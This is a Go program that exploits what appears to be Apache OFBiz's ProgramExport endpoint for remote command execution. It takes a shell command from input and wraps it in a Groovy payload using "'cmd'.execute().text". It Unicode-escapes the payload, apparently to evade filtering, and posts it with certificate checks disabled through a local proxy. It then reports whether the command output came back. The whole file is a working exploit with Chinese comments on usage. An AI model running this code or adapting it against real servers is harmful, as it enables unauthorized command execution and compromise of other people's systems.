package main

import (
	"crypto/tls"
	"fmt"
	"github.com/imroc/req/v3"
	"strings"
)

func CheckUrl(url string) string {
	var URL string
	if strings.HasSuffix(url, "/") {
		URL = url + "webtools/control/main/ProgramExport"
	} else {
		URL = url + "/webtools/control/main/ProgramExport"
	}
	return URL
} //检查URL是否以/结尾
func Scan(url string, command string, Res string) { //传入参数一个是URL 一个是执行的命令
	client := req.C()
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) //要用这个强制https执行才行
	client.SetProxyURL("http://127.0.0.1:1111")
	client.TLSClientConfig.InsecureSkipVerify = true
	request := client.R()
	unicodeencode := Unicodeencode(command)
	post, err := request.SetFormData(map[string]string{
		"groovyProgram": unicodeencode,
	}).Post(url)
	if err != nil {
		fmt.Println("网络错误")
	}
	if post.IsSuccessState() && strings.Contains(post.String(), Res) {
		fmt.Println("命令执行结果：", Res)
		fmt.Println("漏洞URL：", url)
	} else {
		fmt.Println("漏洞不存在")
	}

}

func Unicodeencode(s string) string {
	var result strings.Builder
	for _, r := range s {
		result.WriteString(fmt.Sprintf("\\u%04x", r))
	}
	return result.String() //用来编码unicode
}

func main() {
	u := "https://127.0.0.1:8443/"
	URL := CheckUrl(u)
	var c string
	fmt.Scanf("%s", &c) //最好用expr来用两个数字相加 然后看是否是那个数字
	var res string
	fmt.Scanf("%s", &res)
	command := "throw new Exception('" + c + "'.execute().text);"
	Scan(URL, command, res)
}
